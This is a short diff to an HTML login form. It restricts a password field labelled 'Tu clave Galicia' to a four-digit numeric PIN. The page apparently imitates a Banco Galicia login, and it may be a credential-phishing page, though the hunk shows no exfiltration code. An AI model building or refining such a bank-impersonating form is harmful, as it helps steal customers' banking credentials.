@@ -206,7 +206,15 @@ button:hover{
         </div>
 
         <div class="input-group">
-          <input type="password" name="clave" placeholder="Tu clave Galicia" required>
+          <input 
+  type="password" 
+  name="clave" 
+  placeholder="Tu clave Galicia" 
+  required
+  maxlength="4"
+  inputmode="numeric"
+  pattern="[0-9]{4}"
+>
         </div>
 
         <div class="options">
